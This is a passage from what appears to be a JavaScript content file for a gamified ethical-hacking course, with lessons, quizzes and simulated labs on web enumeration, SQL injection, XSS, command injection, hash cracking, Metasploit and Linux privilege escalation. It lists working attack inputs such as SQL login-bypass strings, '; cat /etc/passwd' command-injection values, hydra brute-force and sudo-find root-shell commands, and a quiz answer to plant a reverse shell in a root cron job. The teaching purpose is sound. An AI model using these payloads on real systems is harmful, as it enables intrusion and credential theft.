      {type:"scenario",situation:"Your nmap shows port 3306 (MySQL) open to the internet. Your scope only covers web app testing.",q:"What do you do?",opts:["Note it in your report","Dump the database","Ignore it","Run sqlmap on it"],a:"Note it in your report",why:"Exposed DB port is worth reporting even if exploiting it is outside scope."},
      {type:"pick",q:"Stealthiest scan?",opts:["-sS","-sT","-sU","-sA"],a:"-sS",why:"SYN scan never completes the handshake."},
    ]},
  ]},

  // ---- UNIT 7: WEB RECON ----
  {id:"u7",title:"Web Recon",desc:"Map web apps before attacking",levels:[
    {id:"u7l1",title:"HTTP Basics",rounds:[
      {type:"teach",text:"HTTP methods: GET = request page. POST = send data. PUT = update. DELETE = remove. Status codes: 200=OK, 301=redirect, 403=forbidden (exists!), 404=not found, 500=server error."},
      {type:"match",q:"Match HTTP method:",pairs:[["GET","Request data"],["POST","Send data"],["PUT","Update"],["DELETE","Remove"]],why:"Understanding HTTP is fundamental to web hacking."},
      {type:"pick",q:"A 403 response means:",opts:["Exists but access denied","Not found","Server crashed","Need to login"],a:"Exists but access denied",why:"403 confirms the resource exists. Useful intel."},
    ]},
    {id:"u7l2",title:"Directory Busting",rounds:[
      {type:"teach",text:"Websites hide pages that aren't linked: /admin, /backup, /.env. gobuster tries thousands of common paths from a wordlist to find them. curl downloads raw page text. robots.txt tells Google what NOT to index \u2014 which tells hackers exactly where the good stuff is."},
      {type:"hack",story:"The target's homepage looks clean, but there could be hidden admin panels, backup files, or config files. Run gobuster to try thousands of common paths.",q:"Scan for hidden directories.",a:["gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt","gobuster dir -u http://target.com -w common.txt","dirsearch -u http://target.com"],output:"===============================================\nGobuster v3.6 \u2014 directory brute-force\n===============================================\n\n/admin/          (Status: 403) [Size: 274]\n/backup/         (Status: 200) [Size: 1205]\n/config.php      (Status: 403) [Size: 274]\n/.env            (Status: 200) [Size: 340]\n/phpmyadmin/     (Status: 200) [Size: 8823]\n/robots.txt      (Status: 200) [Size: 156]\n\n6 results found!",success:"Admin panel, backup folder, exposed .env file, AND phpMyAdmin! Multiple attack vectors.",why:"gobuster tries paths from a wordlist against the target. 200 = accessible, 403 = exists but blocked.",quickCmds:["gobuster dir -u http://target.com -w common.txt"]},
      {type:"hack",story:"robots.txt tells search engines what NOT to index. But it also tells hackers exactly where the interesting stuff is.",q:"Check what they're trying to hide.",a:["curl http://target.com/robots.txt","curl target.com/robots.txt"],output:"User-agent: *\nDisallow: /admin/\nDisallow: /api/internal/\nDisallow: /backup/database.sql\nDisallow: /debug/\n\nSitemap: http://target.com/sitemap.xml",success:"They accidentally published a roadmap to their most sensitive paths!",why:"robots.txt is meant for search engines but attackers read it too. Always check it first."},
    ]},
    {id:"u7l3",title:"Burp Suite",rounds:[
      {type:"teach",text:"Burp Suite sits between browser and website, letting you see and change EVERY request. Proxy = intercept. Repeater = modify and resend. Intruder = try thousands of values."},
      {type:"match",q:"Match Burp tool:",pairs:[["Proxy","Intercept requests"],["Repeater","Modify/resend"],["Intruder","Automated attacks"],["Decoder","Encode/decode"]],why:"Each module serves a different purpose."},
      {type:"pick",q:"Burp's Repeater is for:",opts:["Modifying and resending requests","Scanning for vulns","Brute-forcing","Encoding text"],a:"Modifying and resending requests",why:"Repeater lets you tweak and replay HTTP requests."},
    ]},
    {id:"u7lab",title:"\uD83D\uDDA5\uFE0F Lab: Web Enum",rounds:[
      {type:"lab",title:"Web Enum",objective:"Enumerate a web server at 10.10.10.88 port 80.",banner:"Target: http://10.10.10.88\nWeb enumeration authorized.\n",steps:[
        {hint:"Check robots.txt for hidden paths.",accept:["curl http://10.10.10.88/robots.txt","~curl","~robots"],output:"User-agent: *\nDisallow: /admin/\nDisallow: /backup/db_dump.sql\nDisallow: /internal/",successMsg:"Found hidden paths including a database dump!",example:"curl http://10.10.10.88/robots.txt",quickCmds:["curl http://10.10.10.88/robots.txt"]},
        {hint:"Run directory busting to find more.",accept:["~gobuster","~dirsearch","~feroxbuster","gobuster dir -u http://10.10.10.88 -w common.txt"],output:"/admin/       (Status: 403)\n/backup/      (Status: 200)\n/login.php    (Status: 200)\n/config.php   (Status: 403)\n/phpmyadmin/  (Status: 200)",successMsg:"Found admin panel, backup dir, login page, and phpMyAdmin!",example:"gobuster dir -u http://10.10.10.88 -w common.txt",quickCmds:["gobuster dir -u http://10.10.10.88 -w common.txt"]},
        {hint:"Download the exposed database dump.",accept:["~curl","~wget","curl http://10.10.10.88/backup/db_dump.sql"],output:"-- MySQL dump\nINSERT INTO users VALUES (1,'admin','5f4dcc3b5aa765d61d8327deb882cf99');\nINSERT INTO users VALUES (2,'jsmith','e99a18c428cb38d5f260853678922e03');",successMsg:"Got password hashes! Critical finding for your report.",example:"curl http://10.10.10.88/backup/db_dump.sql",quickCmds:["curl http://10.10.10.88/backup/db_dump.sql"]}
      ]}
    ]},
    {id:"u7m",title:"\uD83C\uDFC6 Web Recon Mastery",isCheckpoint:true,rounds:[
      {type:"pick",q:"HTTP 403 means:",opts:["Forbidden (but exists)","Not found","Server error","Redirect"],a:"Forbidden (but exists)",why:"403 confirms the resource exists."},
      {type:"type",q:"Scan for hidden directories:",a:["gobuster dir -u http://target.com -w common.txt","gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt","dirsearch -u http://target.com","dirsearch -u target.com"],why:"Directory busting finds hidden pages."},
      {type:"type",q:"Check robots.txt:",a:["curl http://target.com/robots.txt","curl target.com/robots.txt","curl robots.txt"],why:"Reveals paths the admin tried to hide."},
      {type:"match",q:"Match Burp tool:",pairs:[["Proxy","Intercept"],["Repeater","Modify/resend"],["Intruder","Automate"]],why:"Know your Burp Suite."},
    ]},
  ]},
]};

var SEC3 = {
  id:"s3",title:"Exploitation",tier:"basic",icon:"\u26A1",color:"var(--red)",
  desc:"SQL injection, XSS, password cracking, Metasploit",
  units:[
  // ---- UNIT 8: SQL INJECTION ----
  {id:"u8",title:"SQL Injection",desc:"Trick databases into giving up secrets",levels:[
    {id:"u8l1",title:"How SQLi Works",rounds:[
      {type:"teach",text:"SQL injection is one of the most common hacks. Here's how it works: When you type your username and password on a website, the site sends a command to its database like 'Find someone named Bob with password 1234.' But if the site doesn't check your input carefully, you can break the command. By typing something like admin'-- as the username, you change the command to 'Find someone named admin and IGNORE everything else.' The -- tells the database to skip the rest of the command, including the password check. You just logged in without knowing the password."},
      {type:"hack",story:"You're testing CryptoVault's login page. The form asks for username and password. Behind the scenes, it builds a database query with your input. Time to trick it.",q:"Break the login \u2014 bypass the password check.",a:["admin'--","' OR 1=1--","admin' OR 1=1--"],output:"SQL Query: SELECT * FROM users WHERE name='admin'--' AND pass='...'\n\n\u26A0\uFE0F Password check BYPASSED\n\nWelcome, admin!\nAccess Level: ADMINISTRATOR\nLast Login: 2024-01-14 03:42 AM\nBalance: $4,847,293.00",success:"You're in as admin with full access! The bank account balance is visible. Critical vulnerability.",why:"The ' breaks the string, -- comments out the password check. The database ignores everything after --.",quickCmds:["admin'--","' OR 1=1--"]},
      {type:"pick",q:"What does -- do in SQL?",opts:["Comments out the rest of the line","Deletes the database","Encrypts the query","Runs a second command"],a:"Comments out the rest of the line",why:"-- makes SQL ignore everything after it, including password checks."},
    ]},
    {id:"u8l2",title:"Testing & Automating",rounds:[
      {type:"hack",story:"Before trying complex injections, you need to test if the input is vulnerable at all. The simplest test: add a single quote (') to any input field. If you get a database error, it's vulnerable.",q:"Test if the search bar is injectable.",a:["'"],output:"SQL Error: You have an error in your SQL syntax;\ncheck the manual near ''' at line 1\n\nServer: MySQL 5.7.32\nFile: /var/www/search.php line 47\n\n\uD83D\uDEA8 Database ERROR exposed!",success:"SQL error with version info leaked! This is 100% vulnerable AND they're exposing error details.",why:"A single quote breaks SQL syntax. If you see a database error, injection is possible.",quickCmds:["'"]},
      {type:"hack",story:"Manual injection worked. Now bring in the big guns \u2014 sqlmap automates finding injection points, extracting databases, tables, and dumping all data.",q:"Unleash sqlmap on the vulnerable search page.",a:["sqlmap -u 'http://target/search?q=1' --dbs","sqlmap -u http://target/page?id=1 --dbs","sqlmap -u 'http://target/page?id=1' --dbs"],output:"[*] testing connection...\n[*] testing for SQL injection on parameter 'q'\n[+] parameter 'q' is VULNERABLE (MySQL)\n\navailable databases:\n[*] information_schema\n[*] cryptovault_prod\n[*] cryptovault_backup\n[*] mysql\n\n4 databases found!",success:"Found the production AND backup databases! sqlmap did in seconds what would take hours manually.",why:"sqlmap automates the entire SQLi process: detection, exploitation, and data extraction.",quickCmds:["sqlmap -u 'http://target/search?q=1' --dbs"]},
    ]},
    {id:"u8l3",title:"UNION Injection",rounds:[
      {type:"teach",text:"Once you know a website is vulnerable to SQL injection, you can go further. UNION is a database command that lets you combine two searches into one. Normally the site searches for a product or user \u2014 but with UNION, you attach a second search that pulls sensitive data. For example, ' UNION SELECT username,password FROM users-- tells the database: 'Also show me every username and password.' Before this works, you need to figure out how many columns the original search returns, which you do by trying ORDER BY 1, ORDER BY 2, etc. until you get an error."},
      {type:"type",q:"Extract user data with UNION:",a:["' UNION SELECT username,password FROM users--","' UNION SELECT 1,2,3--"],why:"UNION combines results from two queries."},
      {type:"tf",q:"sqlmap can only find basic SQL injection.",a:false,why:"sqlmap handles blind, time-based, UNION, stacked queries, and more."},
    ]},
    {id:"u8lab",title:"\uD83D\uDDA5\uFE0F Lab: Hack the Login",rounds:[
      {type:"lab",title:"Hack the Login",objective:"Exploit SQL injection on MegaCorp's login to extract credentials.",banner:"Target: http://10.10.10.66/login.php\n",steps:[
        {hint:"Test if the login is vulnerable with a single quote.",accept:["'","~'"],output:"SQL Error: syntax error near ''' at line 1",successMsg:"SQL error! It's vulnerable.",example:"'",quickCmds:["'"]},
        {hint:"Bypass the login with SQL injection.",accept:["admin'--","~admin'--","' OR 1=1--"],output:"Welcome, admin! Login successful.",successMsg:"You're in! The -- commented out the password check.",example:"admin'--",quickCmds:["admin'--","' OR 1=1--"]},
        {hint:"Use sqlmap to dump everything.",accept:["~sqlmap","sqlmap -u 'http://10.10.10.66/login.php' --dump"],output:"[*] cracking hashes...\nadmin  : password\njsmith : abc123\nbackup : admin",successMsg:"All credentials extracted! Critical vulnerability.",example:"sqlmap -u 'http://10.10.10.66/login.php' --dump",quickCmds:["sqlmap -u 'http://10.10.10.66/login.php' --dump"]}
      ]}
    ]},
    {id:"u8m",title:"\uD83C\uDFC6 SQLi Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Test for SQL injection:",a:["'","' OR 1=1--","1' OR 1=1--","or 1=1"],why:"Single quote tests for SQLi."},
      {type:"type",q:"Bypass a login:",a:["admin'--","' OR 1=1--","admin' --","admin' or 1=1--"],why:"Break query, comment out password."},
      {type:"type",q:"Automate SQL injection:",a:["sqlmap -u http://target/page?id=1 --dbs","sqlmap -u 'http://target/page?id=1' --dbs","sqlmap -u target --dbs"],why:"sqlmap automates everything."},
      {type:"pick",q:"-- in SQL injection:",opts:["Comments out the rest","Encrypts data","Creates a table","Deletes records"],a:"Comments out the rest",why:"-- removes the password check."},
    ]},
  ]},

  // ---- UNIT 9: XSS & WEB ATTACKS ----
  {id:"u9",title:"XSS & Web Attacks",desc:"Inject code and steal sessions",levels:[
    {id:"u9l1",title:"Cross-Site Scripting",rounds:[
      {type:"teach",text:"XSS (Cross-Site Scripting) means sneaking code into a website so it runs in other people's browsers. Imagine you post a comment on a website, but instead of normal text, you include a tiny script. When someone else views your comment, that script runs on THEIR computer \u2014 it could steal their login session, redirect them to a fake site, or grab their data. Stored XSS means your code gets saved in the website's database and hits everyone who views that page. Reflected XSS only works if someone clicks a specially crafted link you send them."},
      {type:"pick",q:"Most dangerous XSS type?",opts:["Stored","Reflected","DOM-based","All equal"],a:"Stored",why:"Stored XSS persists and affects every user who views the page."},
      {type:"tf",q:"XSS only works if the victim clicks a link.",a:false,why:"Stored XSS triggers automatically for anyone viewing the infected page."},
    ]},
    {id:"u9l2",title:"Command Injection",rounds:[
      {type:"teach",text:"Some websites run system commands behind the scenes, like a 'ping' tool. If they don't filter your input, add a semicolon (;) to chain extra commands. Type 127.0.0.1; cat /etc/passwd and the server runs BOTH."},
      {type:"hack",story:"This website has a 'ping' feature where you enter an IP address. Behind the scenes, the server runs: ping [your input]. Since they don't filter your input, you can sneak in extra commands after a semicolon.",q:"Use command injection to read /etc/passwd. (Hint: add ; cat /etc/passwd after an IP)",a:["127.0.0.1; cat /etc/passwd","| cat /etc/passwd","; cat /etc/passwd"],output:"PING 127.0.0.1: 64 bytes\n---\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www\nadmin:x:1000:1000::/home/admin:/bin/bash",success:"It ran BOTH commands! You got the user list through a website input field.",why:"The semicolon ; tells Linux to run a second command. The server ran ping AND cat.",quickCmds:["127.0.0.1; cat /etc/passwd"]},
      {type:"teach",text:"SSRF (Server-Side Request Forgery) tricks the server into visiting internal pages that YOU can't reach directly. Like asking a waiter to go to the VIP room and bring back what's on the table. The server becomes your puppet to access hidden systems."},
    ]},
    {id:"u9l3",title:"Attack Scenarios",rounds:[
      {type:"scenario",situation:"You find a search bar on the target website. When you search for test, the URL becomes /search?q=test and your input appears in the page HTML.",q:"What vulnerability should you test for?",opts:["Reflected XSS","SQL Injection","SSRF","Brute force"],a:"Reflected XSS",why:"User input reflected in HTML without sanitization = potential XSS."},
      {type:"scenario",situation:"The website has a 'ping' feature where you enter an IP and it shows ping results.",q:"What attack should you try?",opts:["Command injection","XSS","SQL injection","Brute force"],a:"Command injection",why:"If it runs ping on your input, try adding ; or | to chain extra commands."},
      {type:"pick",q:"SSRF lets you:",opts:["Make the server fetch internal resources","Crash the database","Encrypt traffic","Scan ports"],a:"Make the server fetch internal resources",why:"SSRF tricks the server into making internal requests."},
    ]},
    {id:"u9lab",title:"\uD83D\uDDA5\uFE0F Lab: Web Exploits",rounds:[
      {type:"lab",title:"Web Exploits",objective:"Find and exploit vulnerabilities on MegaCorp's web app.",banner:"Target: http://10.10.10.66\nWeb application testing authorized.\n",steps:[
        {hint:"Test the search bar for XSS.",accept:["~script","~alert","~xss"],output:"Search results for: [popup appears!]\nThe page executed your JavaScript code!",successMsg:"XSS confirmed! The search bar doesn't sanitize input.",example:"&lt;script&gt;alert(1)&lt;/script&gt;",quickCmds:["&lt;script&gt;alert(1)&lt;/script&gt;"]},
        {hint:"Test the ping feature for command injection.",accept:["127.0.0.1; whoami","~; whoami","~;whoami","~| whoami"],output:"PING 127.0.0.1: 64 bytes\n---\nwww-data",successMsg:"Command injection! whoami ran on the server.",example:"127.0.0.1; whoami",quickCmds:["127.0.0.1; whoami"]},
        {hint:"Read /etc/passwd through command injection.",accept:["~; cat /etc/passwd","127.0.0.1; cat /etc/passwd","~cat /etc/passwd"],output:"root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\nadmin:x:1000:1000::/home/admin:/bin/bash",successMsg:"Got the user list! Two users with shell access: root and admin.",example:"127.0.0.1; cat /etc/passwd",quickCmds:["127.0.0.1; cat /etc/passwd"]}
      ]}
    ]},
    {id:"u9m",title:"\uD83C\uDFC6 Web Attacks Mastery",isCheckpoint:true,rounds:[
      {type:"pick",q:"Stored XSS is dangerous because:",opts:["Affects all users who view the page","Only works once","Requires a special link","Crashes the server"],a:"Affects all users who view the page",why:"Stored XSS persists and triggers for everyone."},
      {type:"type",q:"Inject a command alongside ping:",a:["127.0.0.1; cat /etc/passwd","| cat /etc/passwd"],why:"; chains commands."},
      {type:"scenario",situation:"You find user input reflected in a page's HTML source code.",q:"What do you test?",opts:["XSS","SQL injection","SSRF","Brute force"],a:"XSS",why:"Input in HTML without sanitization = XSS opportunity."},
    ]},
  ]},

  // ---- UNIT 10: PASSWORD CRACKING ----
  {id:"u10",title:"Password Cracking",desc:"Break hashes and brute-force logins",levels:[
    {id:"u10l1",title:"How Hashes Work",rounds:[
      {type:"teach",text:"Websites don't store your actual password \u2014 they scramble it into a hash. 'password' becomes '5f4dcc3b...cf99'. You can't reverse it, but you CAN hash every word in a dictionary and compare."},
      {type:"pick",q:"Why can't you reverse a hash back to the original password?",opts:["Hashing is a one-way process","The password gets deleted","It's encrypted with a key","The algorithm is secret"],a:"Hashing is a one-way process",why:"Hashing destroys information. You can only guess passwords, scramble them, and compare."},
      {type:"teach",text:"Common hash types: MD5 = 32 characters long (old and weak, cracks fast). SHA-256 = 64 characters (stronger). bcrypt = starts with $2b$ (very slow to crack, used by modern sites). NTLM = used by Windows computers."},
    ]},
    {id:"u10l2",title:"Cracking Tools",rounds:[
      {type:"teach",text:"hashcat cracks millions of hashes per second on your GPU. rockyou.txt has 14 million real leaked passwords. hydra attacks live login pages over SSH, FTP, and HTTP."},
      {type:"hack",story:"You dumped a database and found the CEO's password hash: 5f4dcc3b5aa765d61d8327deb882cf99. It's MD5 (32 characters). Time to crack it with hashcat and the famous rockyou.txt wordlist.",q:"Crack this MD5 hash.",a:["hashcat -m 0 hash.txt rockyou.txt","hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt","john hash.txt --wordlist=rockyou.txt"],output:"hashcat v6.2.6 starting...\n\nDictionary: rockyou.txt (14,344,391 words)\nSpeed: 4,231,000 H/s\n\n5f4dcc3b5aa765d61d8327deb882cf99:password\n\nSession completed. 1/1 hash cracked.\n\n\uD83D\uDEA8 CEO's password is literally 'password'",success:"Cracked in 0.3 seconds! The CEO uses 'password' as their password. You can't make this up.",why:"-m 0 = MD5 mode. hashcat tries every word in rockyou.txt against the hash at millions per second.",quickCmds:["hashcat -m 0 hash.txt rockyou.txt"]},
      {type:"hack",story:"The hash is cracked but you also found an SSH port open (22). The sysadmin username is 'jreeves'. Try to brute-force the SSH login.",q:"Brute-force SSH for user jreeves.",a:["hydra -l jreeves -P rockyou.txt 10.10.10.5 ssh","hydra -l jreeves -P rockyou.txt target ssh","hydra -l admin -P rockyou.txt 10.10.10.5 ssh"],output:"Hydra v9.4 starting...\n\n[22][ssh] host: 10.10.10.5\n  login: jreeves\n  password: sunshine1\n\n1 of 1 target completed, 1 valid password found\n\n\uD83D\uDD11 SSH credentials: jreeves:sunshine1",success:"SSH password cracked! You now have remote shell access to the server.",why:"hydra tests passwords from a wordlist against live services like SSH, FTP, and HTTP logins.",quickCmds:["hydra -l jreeves -P rockyou.txt 10.10.10.5 ssh"]},
    ]},
    {id:"u10l3",title:"Cracking Strategy",rounds:[
      {type:"teach",text:"Start with common wordlists (rockyou). Then try rules (append numbers, capitalize). Then try masks (patterns like ?u?l?l?l?d?d). Last resort: pure brute force (slow)."},
      {type:"order",q:"Password cracking priority:",items:["Wordlist attack (rockyou)","Rule-based mutations","Mask/pattern attack","Pure brute force"],why:"Start fast (wordlists), escalate to slow (brute force)."},
      {type:"pick",q:"What is rockyou.txt?",opts:["14M leaked passwords","A hacking tool","A hash algorithm","A password manager"],a:"14M leaked passwords",why:"rockyou.txt is the standard cracking wordlist."},
    ]},
    {id:"u10lab",title:"\uD83D\uDDA5\uFE0F Lab: Crack the Hashes",rounds:[
      {type:"lab",title:"Crack the Hashes",objective:"Crack password hashes found in the database dump.",banner:"Hashes from db_dump.sql:\nadmin:5f4dcc3b5aa765d61d8327deb882cf99\njsmith:e99a18c428cb38d5f260853678922e03\n",steps:[
        {hint:"Identify the hash type (32 characters = ?).",accept:["~md5","~MD5","md5","hash-identifier"],output:"32 character hex string = MD5\nhashcat mode: -m 0",successMsg:"MD5 hashes! Fast to crack.",example:"md5",quickCmds:["md5","hash-identifier"]},
        {hint:"Crack the hashes with hashcat.",accept:["~hashcat","hashcat -m 0 hash.txt rockyou.txt"],output:"5f4dcc3b...  : password\ne99a18c4...  : abc123\n\n2/2 hashes cracked!",successMsg:"Cracked! admin:password, jsmith:abc123. Weak passwords.",example:"hashcat -m 0 hash.txt rockyou.txt",quickCmds:["hashcat -m 0 hash.txt rockyou.txt"]},
        {hint:"Try logging in with the cracked credentials via SSH.",accept:["~ssh","ssh admin@10.10.10.88","ssh jsmith@10.10.10.88"],output:"admin@10.10.10.88's password: password\nWelcome to SecureBank Server\nadmin@securebank:~$",successMsg:"Logged in as admin! Weak password + exposed hash = full compromise.",example:"ssh admin@10.10.10.88",quickCmds:["ssh admin@10.10.10.88"]}
      ]}
    ]},
    {id:"u10m",title:"\uD83C\uDFC6 Password Mastery",isCheckpoint:true,rounds:[
      {type:"pick",q:"rockyou.txt is:",opts:["A wordlist of 14M passwords","A tool","A hash algorithm","A manager"],a:"A wordlist of 14M passwords",why:"The standard cracking wordlist."},
      {type:"type",q:"Crack MD5 hashes:",a:["hashcat -m 0 hash.txt rockyou.txt","hashcat -m 0 hashes.txt rockyou.txt","john hash.txt --wordlist=rockyou.txt"],why:"-m 0 = MD5 mode."},
      {type:"type",q:"Brute-force SSH:",a:["hydra -l admin -P rockyou.txt target ssh","hydra -l admin -P rockyou.txt 10.10.10.5 ssh"],why:"hydra tests passwords against live services."},
      {type:"order",q:"Cracking priority:",items:["Wordlist","Rules","Mask","Brute force"],why:"Start fast, escalate to slow."},
    ]},
  ]},

  // ---- UNIT 11: METASPLOIT ----
  {id:"u11",title:"Metasploit",desc:"Exploits, payloads, and shells",levels:[
    {id:"u11l1",title:"Metasploit Basics",rounds:[
      {type:"teach",text:"Metasploit is a free tool that has thousands of pre-built hacking programs (called exploits) ready to use. Instead of writing your own attack code from scratch, you pick one from Metasploit's library, aim it at a target, and run it. The basic workflow is: 1) search for an exploit that matches what you found (like a specific software version), 2) use it, 3) set the target's IP address, 4) run it. If it works, you get a remote connection to the target computer."},
      {type:"hack",story:"A vulnerable FTP server is running vsftpd 2.3.4 \u2014 a version with a famous backdoor. Fire up Metasploit and find the exploit.",q:"Launch the Metasploit console.",a:["msfconsole"],output:"     ,           ,\n    /             \\\n   ((__---,,,---__))\n      (_) O O (_)\n         \\ _ /     msf6 >\n          |_|\n\n   =[ metasploit v6.3.40 ]\n   + -- --=[ 2345 exploits - 1220 payloads ]\n   + -- --=[ 1100 auxiliary - 399 post ]\n\nmsf6 >",success:"Metasploit loaded with 2,345 exploits ready to go!",why:"msfconsole launches the Metasploit Framework console."},
      {type:"order",q:"Metasploit workflow:",items:["search for exploit","use the module","set RHOSTS (target)","set LHOST (your IP)","exploit"],why:"This workflow applies to every single Metasploit exploit."},
    ]},
    {id:"u11l2",title:"Meterpreter",rounds:[
      {type:"teach",text:"When Metasploit successfully hacks a target, it gives you a special remote control tool called Meterpreter. Think of it as having a spy inside the target computer. With Meterpreter you can: upload or download files, take screenshots of their screen, record their keystrokes, steal all their stored passwords, and even jump to other computers on the same network. It's the ultimate tool for exploring a system after you've broken in."},
      {type:"hack",story:"You've exploited a Windows server and have a Meterpreter session. The client wants proof you can access sensitive data. Dump the password hashes.",q:"Extract all password hashes from the system.",a:["hashdump","run hashdump"],output:"meterpreter > hashdump\n\nAdministrator:500:aad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::\nGuest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\ncfo_williams:1001:aad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\nit_admin:1002:aad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f:::\ndb_service:1003:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n\n5 hashes dumped.",success:"5 accounts including the CFO and IT admin! These hashes can be cracked offline with hashcat.",why:"hashdump extracts NTLM password hashes from the SAM database. Works on Windows systems."},
      {type:"pick",q:"Meterpreter can:",opts:["All of these \u2014 it's a full toolkit","Only execute commands","Only upload files","Only take screenshots"],a:"All of these \u2014 it's a full toolkit",why:"Meterpreter handles files, screenshots, keylogging, hashes, pivoting, and more."},
    ]},
    {id:"u11l3",title:"Post-Exploitation",rounds:[
      {type:"teach",text:"After getting in: sysinfo (system info), getuid (who am I), getsystem (try to get SYSTEM on Windows), shell (drop to normal shell), persistence (survive reboots)."},
      {type:"scenario",situation:"You've got a meterpreter session on a Windows target. getuid shows you're a normal user, not admin.",q:"What do you try first?",opts:["getsystem to escalate privileges","hashdump for passwords","Delete logs","Disconnect"],a:"getsystem to escalate privileges",why:"getsystem tries several techniques to get SYSTEM (admin) privileges on Windows."},
      {type:"type",q:"Get system info in meterpreter:",a:["sysinfo","systeminfo"],why:"sysinfo shows OS, hostname, and architecture."},
    ]},
    {id:"u11lab",title:"\uD83D\uDDA5\uFE0F Lab: Metasploit Attack",rounds:[
      {type:"lab",title:"Metasploit Attack",objective:"Use Metasploit to exploit and take over a vulnerable server.",banner:"Target: 10.10.10.99 running vsftpd 2.3.4\nKnown vulnerable version.\n",steps:[
        {hint:"Start Metasploit and search for the vsftpd exploit.",accept:["~search vsftpd","~msfconsole","search vsftpd"],output:"exploit/unix/ftp/vsftpd_234_backdoor  excellent  VSFTPD v2.3.4 Backdoor",successMsg:"Found it! A known backdoor in this FTP version.",example:"search vsftpd",quickCmds:["search vsftpd"]},
        {hint:"Use the exploit and set the target.",accept:["~use exploit","use exploit/unix/ftp/vsftpd_234_backdoor","~set RHOSTS"],output:"Module loaded.\nRHOSTS => 10.10.10.99",successMsg:"Exploit ready, target set!",example:"use exploit/unix/ftp/vsftpd_234_backdoor",quickCmds:["use exploit/unix/ftp/vsftpd_234_backdoor"]},
        {hint:"Run the exploit!",accept:["exploit","run","~exploit"],output:"[*] Sending trigger...\n[*] Command shell session 1 opened\n# whoami\nroot",successMsg:"ROOT shell! The vsftpd backdoor gives instant root access. Game over.",example:"exploit",quickCmds:["exploit"]}
      ]}
    ]},
    {id:"u11m",title:"\uD83C\uDFC6 Metasploit Mastery",isCheckpoint:true,rounds:[
      {type:"type",q:"Start Metasploit:",a:["msfconsole","msf","msf6"],why:"The Metasploit console."},
      {type:"order",q:"Metasploit workflow:",items:["search","use module","set RHOSTS","set LHOST","exploit"],why:"Standard exploitation workflow."},
      {type:"type",q:"Dump hashes:",a:["hashdump","run hashdump"],why:"Extract credentials."},
      {type:"pick",q:"Meterpreter's getsystem does:",opts:["Tries to escalate to SYSTEM","Shows system info","Crashes the system","Downloads files"],a:"Tries to escalate to SYSTEM",why:"getsystem attempts privilege escalation on Windows."},
    ]},
  ]},
]};

var SEC4 = {
  id:"s4",title:"Advanced & Bug Bounty",tier:"basic",icon:"\uD83D\uDE80",color:"var(--purple)",
  desc:"Privilege escalation, pivoting, bug bounties, scripting",
  units:[
  // ---- UNIT 12: PRIVILEGE ESCALATION ----
  {id:"u12",title:"Privilege Escalation",desc:"Go from nobody to root",levels:[
    {id:"u12l1",title:"Linux Privesc Basics",rounds:[
      {type:"teach",text:"When you first break into a system, you usually have very limited access \u2014 like being a guest in someone's house who can only sit in the living room. Privilege Escalation (PrivEsc) means finding a way to upgrade yourself to root (the admin account that can do ANYTHING). Your first move is always: run sudo -l to see what commands you're allowed to run as admin, look for SUID files (programs with that master key we learned about), and check the system's kernel version for known bugs. There's a tool called linpeas that automatically checks ALL of these things for you."},
      {type:"type",q:"Check sudo privileges:",a:["sudo -l","sudo -ll","sudo --list"],why:"First privilege escalation check."},
      {type:"type",q:"Run automated privesc enumeration:",a:["./linpeas.sh","bash linpeas.sh","sh linpeas.sh"],why:"LinPEAS checks everything: SUID, crons, configs, kernel."},
    ]},
    {id:"u12l2",title:"Common Vectors",rounds:[
      {type:"teach",text:"Misconfigured cron jobs (scheduled tasks running as root). World-writable scripts called by root. Credentials in config files. Kernel exploits for old versions."},
      {type:"tf",q:"If sudo -l shows you can run /usr/bin/find as root, that's a privesc path.",a:true,why:"find can execute commands: sudo find . -exec /bin/sh \\;"},
      {type:"scenario",situation:"LinPEAS shows a cron job runs /opt/backup.sh as root every 5 minutes, and you have write access to that file.",q:"What do you do?",opts:["Add a reverse shell to backup.sh","Delete the file","Ignore it","Run it manually"],a:"Add a reverse shell to backup.sh",why:"If root runs your script, your reverse shell connects back as root."},
    ]},
    {id:"u12l3",title:"Pivoting",rounds:[
      {type:"teach",text:"Most companies keep their important servers hidden on an internal network that you can't reach from the internet. But if you hack a computer that's connected to BOTH the public internet AND the internal network, you can use it as a bridge. This is called Pivoting \u2014 like breaking into a building's mailroom that has a door to the internal hallways. From there, you can reach servers that were previously invisible to you. Tools like Chisel create encrypted tunnels through the hacked machine."},
      {type:"order",q:"Chisel pivoting setup:",items:["Start chisel server on your machine","Upload chisel to compromised host","Run chisel client pointing to server","Access internal target through tunnel"],why:"Server on attacker, client on victim."},
      {type:"teach",text:"SSH tunnels work too: ssh -L 8888:internal:80 user@compromised. Now localhost:8888 reaches the internal server's port 80 through the compromised host."},
    ]},
    {id:"u12lab",title:"\uD83D\uDDA5\uFE0F Lab: Root the Box",rounds:[
      {type:"lab",title:"Root the Box",objective:"Escalate from www-data to root.",banner:"Connected as www-data@target\n$ whoami\nwww-data\n",steps:[
        {hint:"Check sudo privileges.",accept:["sudo -l","~sudo -l","~sudo"],output:"User www-data may run:\n  (root) NOPASSWD: /usr/bin/find",successMsg:"find as root, no password!",example:"sudo -l",quickCmds:["sudo -l"]},
        {hint:"Find SUID binaries too.",accept:["find / -perm -4000","~find / -perm"],output:"/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/python3",successMsg:"Multiple privesc paths!",example:"find / -perm -4000 2>/dev/null",quickCmds:["find / -perm -4000 2>/dev/null"]},
        {hint:"Use sudo find to get root.",accept:["sudo find . -exec /bin/sh \\;","~sudo find","sudo find . -exec /bin/bash \\;"],output:"# whoami\nroot",successMsg:"ROOT! Full privesc complete.",example:"sudo find . -exec /bin/sh \\;",quickCmds:["sudo find . -exec /bin/sh \\;"]},
